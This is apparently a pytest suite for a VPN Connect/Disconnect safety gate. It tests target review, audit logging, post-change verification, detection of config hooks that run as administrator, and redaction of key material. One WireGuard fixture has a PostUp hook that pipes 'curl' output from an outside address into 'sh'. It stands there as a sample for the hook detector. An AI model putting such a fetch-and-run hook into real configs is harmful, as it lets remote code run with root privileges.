"""Tunnel phase 3b — the gate around live Connect/Disconnect.

Nothing here runs wg-quick, openvpn, route, pfctl, sudo or osascript: the
privileged runner, the local-state probe and the kill-switch state are all
injected, and the audit log is written under tmp_path.
"""

from __future__ import annotations

import json
import os

import pytest

from services import vpn_connection, vpn_execution

PRIVATE_KEY = "cHJpdmF0ZS1rZXktdGhhdC1tdXN0LW5ldmVyLWxlYWsxMjM0NTY3OA=="


class Recorder:
    def __init__(self, ok=True, output="ok"):
        self.ok, self.output, self.scripts = ok, output, []

    def __call__(self, script, prompt, timeout=30):
        self.scripts.append(script)
        return self.ok, self.output


class Probe(dict):
    """Fake local state: which interfaces are up, OpenVPN, and the public route."""

    def __init__(self, up=(), device="utun7", route=None, openvpn=False):
        self.up = set(up)
        self.openvpn = openvpn
        super().__init__(
            wireguard=lambda name: ({"up": True, "device": device}
                                    if name in self.up else {"up": False, "device": None}),
            openvpn_running=lambda: self.openvpn,
            route_interface=lambda: route,
        )


@pytest.fixture(autouse=True)
def wg_quick_installed(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: None if name == "wg-quick" else real_which(name, *a, **k))


def write_conf(tmp_path, name="wgnl", allowed="0.0.0.0/0, ::/0", dns="10.8.0.1", mode=0o600):
    path = tmp_path / f"{name}.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\n"
        "Address = 10.8.0.2/32\n"
        + (f"DNS = {dns}\n" if dns else "")
        + "\n[Peer]\n"
        f"PublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        f"PresharedKey = {PRIVATE_KEY}\n"
        "Endpoint = 203.0.113.7:51820\n"
        f"AllowedIPs = {allowed}\n",
        encoding="utf-8",
    )
    os.chmod(path, mode)
    return path


def profile_for(path):
    return vpn_connection.profile_from_config(str(path))


def review(action, profile, probe=None, armed=False):
    return vpn_execution.review_execution(action, profile, probe=probe or Probe(),
                                          killswitch_armed=lambda: armed)


# ── Target review ───────────────────────────────────────────────────────────

def test_review_names_target_command_intent_and_rollback(tmp_path):
    path = write_conf(tmp_path)
    r = review("connect", profile_for(path))
    assert r.allowed
    assert r.target == str(path)
    assert r.interface == "wgnl"
    assert r.command.endswith(f"up '{path}'")
    assert r.route_mode == "Full tunnel"
    assert any("203.0.113.7:51820" in line for line in r.config_lines)
    assert any("10.8.0.1" in line for line in r.config_lines)
    assert any("Disconnect" in item and "down" in item for item in r.rollback)


def test_review_never_carries_key_material(tmp_path):
    r = review("connect", profile_for(write_conf(tmp_path)))
    everything = r.confirmation_text() + json.dumps(r.sections())
    assert PRIVATE_KEY not in everything


@pytest.mark.parametrize("profile, reason", [
    ({"name": "Example", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
      "interface": "wgjp", "placeholder": True}, "template"),
    ({"name": "No target", "protocol": "WireGuard", "endpoint": "203.0.113.7"},
     "no interface or config"),
    ({"name": "Bad name", "protocol": "WireGuard", "endpoint": "203.0.113.7",
      "interface": "my home vpn"}, "not a valid wireguard interface name"),
    ({"name": "Gone", "protocol": "WireGuard", "endpoint": "203.0.113.7",
      "config_path": "/nonexistent/wgx.conf"}, "no longer exists"),
    ({"name": "Weird", "protocol": "IPsec", "endpoint": "203.0.113.7"}, "unsupported"),
])
def test_review_blocks_what_would_fail_or_mislead(profile, reason):
    r = review("connect", profile)
    assert not r.allowed
    assert reason in " ".join(r.blockers).lower()


def test_review_blocks_when_wg_quick_is_missing(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: False)
    r = review("connect", {"name": "VPS", "protocol": "WireGuard",
                           "endpoint": "203.0.113.7", "interface": "wg0"})
    assert any("wg-quick not found" in b for b in r.blockers)


def test_config_file_name_must_be_a_valid_interface(tmp_path):
    path = write_conf(tmp_path, name="My Home VPN")
    r = review("connect", profile_for(path))
    assert any("rename the file" in b for b in r.blockers)


def test_connecting_an_interface_that_is_already_up_is_refused(tmp_path):
    r = review("connect", profile_for(write_conf(tmp_path)), Probe(up={"wgnl"}))
    assert any("already up" in b for b in r.blockers)


def test_disconnect_warns_about_clear_traffic_or_armed_kill_switch():
    profile = {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7",
               "interface": "wg0"}
    clear = review("disconnect", profile, Probe(up={"wg0"}), armed=False)
    assert clear.allowed
    assert any("in the clear" in w for w in clear.warnings)
    assert any("Connect" in item for item in clear.rollback)
    armed = review("disconnect", profile, Probe(up={"wg0"}), armed=True)
    assert any("kill switch is armed" in w.lower() for w in armed.warnings)


def test_disconnect_does_not_refuse_a_template_so_a_stuck_tunnel_can_come_down():
    r = review("disconnect", {"name": "Example", "protocol": "WireGuard",
                              "endpoint": "<SERVER_IP>", "interface": "wgjp",
                              "placeholder": True}, Probe(up={"wgjp"}))
    assert r.allowed


def test_readable_config_and_split_tunnel_are_warned(tmp_path):
    path = write_conf(tmp_path, allowed="10.0.0.0/8", mode=0o644)
    r = review("connect", profile_for(path))
    assert r.allowed
    joined = " ".join(r.warnings)
    assert "chmod 600" in joined
    assert "Split tunnel" in joined


def test_config_without_a_peer_endpoint_is_blocked(tmp_path):
    path = tmp_path / "wgx.conf"
    path.write_text(f"[Interface]\nPrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n",
                    encoding="utf-8")
    r = review("connect", profile_for(path))
    assert any("no peer endpoint" in b for b in r.blockers)


def test_openvpn_review_requires_client_and_file(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: False)
    r = review("connect", {"name": "O", "protocol": "OpenVPN", "endpoint": "203.0.113.7",
                           "config_path": str(tmp_path / "missing.ovpn")})
    joined = " ".join(r.blockers)
    assert "openvpn client not found" in joined
    assert "no longer exists" in joined


# ── Command construction (the PATH the admin dialog does not have) ──────────

def test_wg_quick_command_uses_an_absolute_path_and_its_directory(monkeypatch):
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: "/opt/homebrew/bin/wg-quick")
    assert vpn_connection.wg_quick_command("up", "/Users/me/wg nl.conf") == (
        "PATH='/opt/homebrew/bin':\"$PATH\" '/opt/homebrew/bin/wg-quick' "
        "up '/Users/me/wg nl.conf'")


def test_rollback_is_a_command_a_person_can_type(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: "/opt/homebrew/bin/wg-quick")
    path = write_conf(tmp_path)
    r = review("connect", profile_for(path))
    assert r.command.startswith("PATH=")
    assert r.rollback[0].endswith(f"sudo wg-quick down '{path}'")


# ── Execution, post-change check and audit ──────────────────────────────────

def test_a_blocked_action_runs_nothing_and_is_audited(tmp_path):
    run = Recorder()
    audit = tmp_path / "audit.jsonl"
    outcome = vpn_execution.execute(
        "connect", {"name": "Example", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
                    "interface": "wgjp", "placeholder": True},
        run_as_root=run, probe=Probe(), killswitch_armed=lambda: False, audit_path=audit)
    assert run.scripts == []
    assert outcome.ran is False
    assert outcome.as_result()["success"] is False
    assert outcome.status_line.startswith("Refused")
    entry = json.loads(audit.read_text().splitlines()[-1])
    assert entry["outcome"] == "refused"
    assert entry["blockers"]


def test_verified_full_tunnel_connect(tmp_path):
    path = write_conf(tmp_path)
    probe = Probe(route="utun7")
    run = Recorder()

    def runner(script, prompt, timeout=30):
        probe.up.add("wgnl")          # the tunnel comes up when the command runs
        return run(script, prompt, timeout)

    audit = tmp_path / "audit.jsonl"
    outcome = vpn_execution.execute("connect", profile_for(path), run_as_root=runner,
                                    probe=probe, killswitch_armed=lambda: False,
                                    audit_path=audit, sleep=lambda s: None)
    assert run.scripts == [f"wg-quick up '{path}'"]
    assert outcome.success and outcome.verified is True
    assert "utun7" in outcome.verification
    assert "not verified" in outcome.verification  # handshake/DNS honesty
    result = outcome.as_result()
    assert result["success"] is True and result["sections"]
    assert "verified locally" in result["status_line"]
    text = audit.read_text()
    assert PRIVATE_KEY not in text
    entry = json.loads(text.splitlines()[-1])
    assert entry["outcome"] == "succeeded" and entry["verified"] is True
    assert entry["interface"] == "wgnl"
    assert oct(audit.stat().st_mode & 0o777) == "0o600"


def test_command_success_without_the_interface_is_not_verified(tmp_path):
    slept = []
    outcome = vpn_execution.execute(
        "connect", profile_for(write_conf(tmp_path)), run_as_root=Recorder(),
        probe=Probe(), killswitch_armed=lambda: False,
        audit_path=tmp_path / "a.jsonl", sleep=slept.append)
    assert outcome.success is True
    assert outcome.verified is False
    assert "NOT verified" in outcome.status_line
    assert len(slept) == 2           # retried before concluding


def test_full_tunnel_whose_route_bypasses_the_tunnel_is_not_verified(tmp_path):
    path = write_conf(tmp_path)
    probe = Probe(route="en0")

    def runner(script, prompt, timeout=30):
        probe.up.add("wgnl")
        return True, ""

    outcome = vpn_execution.execute("connect", profile_for(path), run_as_root=runner,
                                    probe=probe, killswitch_armed=lambda: False,
                                    audit_path=tmp_path / "a.jsonl", sleep=lambda s: None)
    assert outcome.verified is False
    assert "en0" in outcome.verification


def test_verified_disconnect(tmp_path):
    probe = Probe(up={"wg0"})

    def runner(script, prompt, timeout=30):
        probe.up.discard("wg0")
        return True, ""

    outcome = vpn_execution.execute(
        "disconnect", {"name": "VPS", "protocol": "WireGuard",
                       "endpoint": "203.0.113.7", "interface": "wg0"},
        run_as_root=runner, probe=probe, killswitch_armed=lambda: False,
        audit_path=tmp_path / "a.jsonl", sleep=lambda s: None)
    assert outcome.verified is True
    assert "no longer recorded as up" in outcome.verification


def test_a_failed_command_is_reported_and_audited(tmp_path):
    audit = tmp_path / "a.jsonl"
    outcome = vpn_execution.execute(
        "connect", profile_for(write_conf(tmp_path)),
        run_as_root=Recorder(ok=False, output="Cancelled."), probe=Probe(),
        killswitch_armed=lambda: False, audit_path=audit, sleep=lambda s: None)
    assert outcome.success is False
    assert outcome.status_line.startswith("Failed: Cancelled.")
    assert json.loads(audit.read_text())["outcome"] == "failed"


def test_audit_failure_never_breaks_the_action(tmp_path):
    blocked = tmp_path / "file"
    blocked.write_text("x")
    outcome = vpn_execution.execute(
        "connect", {"name": "Example", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
                    "placeholder": True, "interface": "wgjp"},
        run_as_root=Recorder(), probe=Probe(), killswitch_armed=lambda: False,
        audit_path=blocked / "audit.jsonl")
    assert outcome.audit_path is None
    assert "could not be written" in json.dumps(outcome.sections())


def test_kill_switch_changes_are_audited(tmp_path):
    audit = tmp_path / "a.jsonl"
    vpn_execution.record_killswitch("arm", True, "Kill switch ARMED", audit_path=audit)
    entry = json.loads(audit.read_text())
    assert entry["action"] == "killswitch-arm" and entry["outcome"] == "succeeded"


def test_suite_never_writes_the_operators_audit_log():
    """conftest's `_isolated_tunnel_audit` must stay in place.

    Without it, any test that omits `audit_path` appends fake kill-switch
    records to the real data/logs/tunnel_audit.jsonl.
    """
    from services import runtime_paths

    real = runtime_paths.user_data_base() / "data" / "logs" / vpn_execution.AUDIT_FILENAME
    assert vpn_execution.default_audit_path() != real
    assert not vpn_execution.default_audit_path().is_relative_to(runtime_paths.user_data_base())


def test_openvpn_post_check_reads_the_tracked_process(tmp_path, monkeypatch):
    conf = tmp_path / "home.ovpn"
    conf.write_text("client\nremote 203.0.113.7 1194\n")
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    probe = Probe()
    monkeypatch.setattr(vpn_connection.openvpn_manager, "connect",
                        lambda path, run_as_root: (setattr(probe, "openvpn", True)
                                                   or {"success": True, "output": ""}))
    outcome = vpn_execution.execute("connect", profile_for(conf), probe=probe,
                                    run_as_root=Recorder(), killswitch_armed=lambda: False,
                                    audit_path=tmp_path / "a.jsonl", sleep=lambda s: None)
    assert outcome.verified is True


# ── Local state probe ───────────────────────────────────────────────────────

def test_interface_state_reads_wg_quick_run_records(tmp_path):
    assert vpn_execution.wireguard_interface_state("wg0", tmp_path) == {"up": False, "device": None}
    (tmp_path / "wg0.name").write_text("utun5\n")
    assert vpn_execution.wireguard_interface_state("wg0", tmp_path)["up"] is False  # stale: no socket
    (tmp_path / "utun5.sock").write_text("")
    assert vpn_execution.wireguard_interface_state("wg0", tmp_path) == {"up": True, "device": "utun5"}


# ── Refusals before execute() are audited too ────────────────────────────────

def test_record_refusal_matches_the_execute_entry_shape(tmp_path):
    import json
    audit = tmp_path / "audit.jsonl"
    review = vpn_execution.review_execution(
        "connect", {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7",
                    "interface": "wg0"},
        probe=Probe(), killswitch_armed=lambda: False)
    vpn_execution.record_refusal("connect", {"name": "VPS"}, "Operator declined.",
                                 review=review, outcome="declined", audit_path=audit)
    entry = json.loads(audit.read_text().splitlines()[-1])
    assert set(entry) >= {"time", "action", "protocol", "profile", "target", "interface",
                          "command", "outcome", "blockers", "warnings", "verified",
                          "verification", "error"}
    assert entry["outcome"] == "declined" and entry["profile"] == "VPS"
    assert entry["command"] == review.command and entry["verified"] is None
    assert oct(audit.stat().st_mode & 0o777) == "0o600"


def test_record_refusal_without_a_review_uses_the_profile(tmp_path):
    import json
    audit = tmp_path / "audit.jsonl"
    vpn_execution.record_refusal(
        "connect", {"name": "Example — Japan", "protocol": "OpenVPN", "endpoint": "<SERVER_IP>"},
        "Template profile.", audit_path=audit)
    entry = json.loads(audit.read_text().splitlines()[-1])
    assert entry["outcome"] == "refused" and entry["protocol"] == "OpenVPN"
    assert entry["target"] == "<SERVER_IP>" and entry["command"] == ""


# ── Hooks that run as root are named and confirmed separately ───────────────

def test_wireguard_hooks_are_listed_and_the_key_is_not(tmp_path):
    path = tmp_path / "wgx.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\n"
        "Address = 10.8.0.2/32\n"
        "PostUp = iptables -A FORWARD -i %i -j ACCEPT; curl -s http://203.0.113.9/x | sh\n"
        "postdown = /usr/local/bin/cleanup.sh\n"
        "# PreUp = commented out, must be ignored\n"
        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
    hooks = vpn_execution.config_root_hooks(path, "WireGuard")
    assert len(hooks) == 2
    assert hooks[0].startswith("PostUp: iptables")
    assert hooks[1].startswith("postdown: /usr/local/bin/cleanup.sh")
    assert PRIVATE_KEY not in " ".join(hooks)


def test_openvpn_hooks_are_listed(tmp_path):
    path = tmp_path / "srv.ovpn"
    path.write_text(
        "client\nproto udp\nremote 203.0.113.7 1194\n"
        "script-security 2\n"
        "up /etc/openvpn/update-resolv-conf\n"
        "--down /etc/openvpn/update-resolv-conf\n"
        "plugin /usr/lib/openvpn/openvpn-plugin-auth-pam.so login\n"
        "# up something-commented\n"
        "<ca>\nMIIBogus\n</ca>\n")
    hooks = vpn_execution.config_root_hooks(path, "OpenVPN")
    assert [h.split(":")[0] for h in hooks] == ["script-security", "up", "--down", "plugin"]


def test_a_plain_config_has_no_hooks(tmp_path):
    assert vpn_execution.config_root_hooks(write_conf(tmp_path), "WireGuard") == []
    assert vpn_execution.config_root_hooks(tmp_path / "missing.conf", "WireGuard") == []


def test_review_surfaces_hooks_in_sections_confirmation_and_warnings(tmp_path):
    path = tmp_path / "wgh.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n"
        "PostUp = /opt/hook.sh up\n"
        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == ("PostUp: /opt/hook.sh up",)
    assert r.allowed                                        # a warning, not a blocker
    titles = [title for title, _, _ in r.sections()]
    assert "Runs commands as administrator" in titles
    assert "RUNS COMMANDS AS ADMINISTRATOR" in r.confirmation_text()
    assert "/opt/hook.sh up" in r.confirmation_text()
    assert any("as administrator" in w for w in r.warnings)


def test_openvpn_review_surfaces_hooks(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    path = tmp_path / "srv.ovpn"
    path.write_text("client\nremote 203.0.113.7 1194\nscript-security 2\nup /x/y.sh\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == ("script-security: 2", "up: /x/y.sh")


def test_disconnect_review_does_not_rescan_hooks(tmp_path):
    path = tmp_path / "wgh.conf"
    path.write_text(
        "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\nPostUp = /opt/hook.sh\n"
        "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
    r = review("disconnect", profile_for(path), probe=Probe(up={"wgh"}))
    assert r.root_hooks == ()


# ── Key material never reaches the Execution tab or the audit log ───────────

CANARY = "cGFub3B0aWNvbi1zZWNyZXQta2V5LWNhbmFyeS0wMDAxMjM="   # 44-char base64

@pytest.mark.parametrize("text, must_vanish", [
    (f"Line unrecognized: `PrivateKey = {CANARY}`", CANARY),
    (f"PresharedKey={CANARY}", CANARY),
    (f"auth-user-pass hunter2 mypassword", "hunter2"),
    (f"<key>\n-----BEGIN PRIVATE KEY-----\nMIIBogusKeyBody\n-----END PRIVATE KEY-----\n</key>", "MIIBogusKeyBody"),
    (f"peer {CANARY} handshake failed", CANARY),
])
def test_redact_secrets_scrubs_each_shape(text, must_vanish):
    out = vpn_execution.redact_secrets(text)
    assert must_vanish not in out
    assert "redacted" in out


def test_redact_secrets_leaves_ordinary_output_alone():
    text = "[#] ip link add wg0 type wireguard\n[#] wg setconf wg0 /dev/fd/63\nRTNETLINK answers: File exists"
    assert vpn_execution.redact_secrets(text) == text
    assert vpn_execution.redact_secrets("") == ""
    assert vpn_execution.redact_secrets(None) == ""


def test_execute_redacts_tool_output_and_error_everywhere(tmp_path):
    import json
    conf = write_conf(tmp_path)
    audit = tmp_path / "audit.jsonl"
    leaked = f"wg-quick: Line unrecognized: `PrivateKey = {PRIVATE_KEY}`"

    def run(script, prompt, timeout=30):
        return False, leaked
    outcome = vpn_execution.execute("connect", profile_for(conf), run_as_root=run,
                                    probe=Probe(), killswitch_armed=lambda: False,
                                    audit_path=audit, sleep=lambda s: None)
    everything = json.dumps(outcome.as_result()) + audit.read_text()
    assert PRIVATE_KEY not in everything
    assert "[redacted]" in everything
